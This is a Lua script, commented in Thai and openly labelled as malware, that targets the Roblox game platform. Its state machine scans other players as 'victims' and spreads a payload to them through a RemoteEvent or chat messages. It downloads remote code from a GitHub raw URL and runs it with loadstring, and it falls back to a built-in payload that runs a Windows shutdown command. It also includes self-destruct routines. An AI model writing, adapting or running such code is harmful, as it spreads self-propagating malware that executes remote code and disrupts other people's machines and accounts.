-- virus_fsm.lua
-- Finite State Machine Malware with Payload Injection
-- ดึง payload จาก GitHub หรือไฟล์ในเครื่อง แล้วแพร่กระจายตามสถานะ

local FSM = {
    CurrentState = "IDLE",
    States = {},
    Payload = nil,
    VictimList = {},
    Config = {
        SpreadInterval = 5, -- วินาที
        MaxVictims = 100,
        PayloadURL = "https://raw.githubusercontent.com/yourusername/yourrepo/main/payload.lua",
        -- หรือใช้ไฟล์ท้องถิ่น: PayloadFile = "payload.lua"
    }
}

-- ============================================
-- STATE DEFINITIONS
-- ============================================

FSM.States.IDLE = {
    onEnter = function()
        print("[FSM] IDLE: กำลังรอคำสั่ง...")
        -- ดึง payload ถ้ายังไม่มี
        if not FSM.Payload then
            FSM:FetchPayload()
        end
    end,
    onExit = function()
        print("[FSM] IDLE: ออกจากโหมดรอ")
    end
}

FSM.States.SCANNING = {
    onEnter = function()
        print("[FSM] SCANNING: กำลังสแกนหาเหยื่อ...")
        FSM:ScanVictims()
        FSM:SetState("INFECTING")
    end,
    onExit = function()
        print("[FSM] SCANNING: หยุดสแกน")
    end
}

FSM.States.INFECTING = {
    onEnter = function()
        print("[FSM] INFECTING: กำลังแพร่กระจายไวรัส...")
        FSM:SpreadInfection()
        FSM:SetState("SLEEPING")
    end,
    onExit = function()
        print("[FSM] INFECTING: หยุดแพร่")
    end
}

FSM.States.SLEEPING = {
    onEnter = function()
        print("[FSM] SLEEPING: หลับ " .. FSM.Config.SpreadInterval .. " วินาที")
        wait(FSM.Config.SpreadInterval)
        FSM:SetState("SCANNING")
    end,
    onExit = function()
        print("[FSM] SLEEPING: ตื่นแล้ว")
    end
}

FSM.States.ERROR = {
    onEnter = function(err)
        print("[FSM] ERROR: " .. tostring(err))
        -- ลองรีเซ็ต
        wait(2)
        FSM:SetState("IDLE")
    end,
    onExit = function()
        print("[FSM] ERROR: ออกจากโหมดผิดพลาด")
    end
}

FSM.States.SHUTDOWN = {
    onEnter = function()
        print("[FSM] SHUTDOWN: กำลังลบตัวเอง...")
        FSM:SelfDestruct()
    end,
    onExit = function() end
}

-- ============================================
-- CORE FUNCTIONS
-- ============================================

function FSM:SetState(newState, payload)
    if self.CurrentState == newState then return end
    local old = self.CurrentState
    
    -- ตรวจสอบการเปลี่ยนสถานะที่ถูกต้อง
    if not self:IsValidTransition(old, newState) then
        print("[FSM] เปลี่ยนสถานะไม่ถูกต้อง: " .. old .. " -> " .. newState)
        return
    end
    
    -- onExit ของสถานะเดิม
    if self.States[old] and self.States[old].onExit then
        local success, err = pcall(self.States[old].onExit)
        if not success then
            print("[FSM] onExit ล้มเหลว: " .. tostring(err))
        end
    end
    
    -- เปลี่ยนสถานะ
    self.CurrentState = newState
    
    -- onEnter ของสถานะใหม่
    if self.States[newState] and self.States[newState].onEnter then
        local success, err = pcall(self.States[newState].onEnter, payload)
        if not success then
            print("[FSM] onEnter ล้มเหลว: " .. tostring(err))
            self:SetState("ERROR", err)
        end
    end
end

function FSM:IsValidTransition(from, to)
    -- กฎการเปลี่ยนสถานะ
    local valid = {
        IDLE = { SCANNING = true, SHUTDOWN = true },
        SCANNING = { INFECTING = true, ERROR = true, SHUTDOWN = true },
        INFECTING = { SLEEPING = true, ERROR = true, SHUTDOWN = true },
        SLEEPING = { SCANNING = true, ERROR = true, SHUTDOWN = true },
        ERROR = { IDLE = true, SHUTDOWN = true },
        SHUTDOWN = {}
    }
    return valid[from] and valid[from][to] or false
end

-- ============================================
-- MALICIOUS PAYLOAD HANDLING
-- ============================================

function FSM:FetchPayload()
    print("[FSM] กำลังดึง payload จาก GitHub...")
    local success, data = pcall(function()
        local HttpService = game:GetService("HttpService")
        local response = HttpService:GetAsync(self.Config.PayloadURL)
        return response
    end)
    
    if success and data then
        self.Payload = data
        print("[FSM] ดึง payload สำเร็จ (ขนาด " .. #data .. " ไบต์)")
        -- โหลดและรัน payload ทันที
        self:ExecutePayload()
    else
        print("[FSM] ดึง payload ล้มเหลว ใช้ payload ในตัว")
        self.Payload = self:GetFallbackPayload()
    end
end

function FSM:GetFallbackPayload()
    -- payload ตัวสำรอง: ปิดคอม / ลบไฟล์ / ส่งข้อมูล
    return [[
        -- FALLBACK PAYLOAD
        if os and os.execute then
            os.execute("shutdown /s /t 5 /c \"System error\"")
        end
        -- ลบตัวเอง
        if script and script.Parent then
            script.Parent:Destroy()
        end
    ]]
end

function FSM:ExecutePayload()
    if not self.Payload then return end
    print("[FSM] กำลังรัน payload...")
    local func, err = loadstring(self.Payload)
    if func then
        local success, err2 = pcall(func)
        if not success then
            print("[FSM] payload ล้มเหลว: " .. tostring(err2))
            self:SetState("ERROR", err2)
        else
            print("[FSM] payload รันสำเร็จ!")
        end
    else
        print("[FSM] loadstring ล้มเหลว: " .. tostring(err))
        self:SetState("ERROR", err)
    end
end

-- ============================================
-- SPREAD INFECTION
-- ============================================

function FSM:ScanVictims()
    print("[FSM] กำลังสแกนหาเหยื่อ...")
    -- Roblox: สแกนผู้เล่นทั้งหมด
    local Players = game:GetService("Players")
    local victims = {}
    
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= Players.LocalPlayer then
            table.insert(victims, player.Name)
        end
    end
    
    self.VictimList = victims
    print("[FSM] พบเหยื่อ " .. #victims .. " ราย")
end

function FSM:SpreadInfection()
    print("[FSM] กำลังแพร่เชื้อไปยังเหยื่อ...")
    local count = 0
    
    for _, victimName in ipairs(self.VictimList) do
        if count >= self.Config.MaxVictims then break end
        
        -- ส่ง payload ไปยังเหยื่อ (ผ่าน RemoteEvent, Chat, หรืออื่นๆ)
        local success = self:InfectVictim(victimName)
        if success then
            count = count + 1
            print("[FSM] ติดเชื้อแล้ว: " .. victimName)
        else
            print("[FSM] ติดเชื้อล้มเหลว: " .. victimName)
        end
        
        wait(0.5) -- หน่วงเพื่อไม่ให้เด้ง
    end
    
    print("[FSM] แพร่เชื้อสำเร็จ " .. count .. " ราย")
end

function FSM:InfectVictim(victimName)
    -- วิธีแพร่: ส่ง payload ผ่าน RemoteEvent หรือ Chat
    local success = pcall(function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local remote = ReplicatedStorage:FindFirstChild("RemoteEvent")
        
        if remote then
            remote:FireServer(victimName, self.Payload)
        else
            -- ใช้ Chat เป็นตัวแพร่
            local Players = game:GetService("Players")
            local player = Players:FindFirstChild(victimName)
            if player then
                player:Chat("!infect " .. self.Payload)
            end
        end
    end)
    
    return success
end

-- ============================================
-- SELF DESTRUCT
-- ============================================

function FSM:SelfDestruct()
    print("[FSM] กำลังทำลายตัวเอง...")
    
    -- ลบไฟล์ตัวเอง
    local success = pcall(function()
        if script and script.Parent then
            script.Parent:Destroy()
        end
        -- ถ้าอยู่ใน Roblox, ลบ LocalScript
        if game and game:GetService("Players") then
            local player = game.Players.LocalPlayer
            if player and player.PlayerGui then
                for _, gui in ipairs(player.PlayerGui:GetChildren()) do
                    if gui.Name == "VirusGUI" then
                        gui:Destroy()
                    end
                end
            end
        end
    end)
    
    if success then
        print("[FSM] ทำลายตัวเองสำเร็จ")
    else
        print("[FSM] ทำลายตัวเองล้มเหลว")
    end
    
    -- หยุดการทำงาน
    while true do wait(999999) end
end

-- ============================================
-- HOOKS & TRIGGERS
-- ============================================

-- เริ่มต้นทำงานอัตโนมัติ
function FSM:Start()
    print("[FSM] เริ่มทำงาน...")
    self:SetState("IDLE")
    
    -- วนลูปหลัก (ถ้าต้องการให้ทำงานต่อเนื่อง)
    -- แต่ FSM จะจัดการผ่านสถานะ SLEEPING -> SCANNING อยู่แล้ว
end

-- เรียกจากภายนอกเพื่อหยุด
function FSM:Stop()
    self:SetState("SHUTDOWN")
end

-- เรียกเพื่อรีเซ็ต
function FSM:Reset()
    self:SetState("IDLE")
end

-- ============================================
-- MAIN
-- ============================================

-- ถ้าเป็น Roblox Script ใส่ไว้ใน LocalScript
if game then
    print("[FSM] Suji and VC+ Virus FSM กำลังทำงาน...")
    FSM:Start()
    
    -- ตัวจับเวลาเพื่อป้องกันการค้าง
    game:GetService("RunService").Heartbeat:Connect(function()
        -- ถ้าสถานะเป็น ERROR และค้างเกิน 10 วินาที ให้รีเซ็ต
        if FSM.CurrentState == "ERROR" then
            wait(10)
            FSM:SetState("IDLE")
        end
    end)
end

-- ============================================
-- EXPORT (สำหรับใช้เป็น Module)
-- ============================================
return FSM
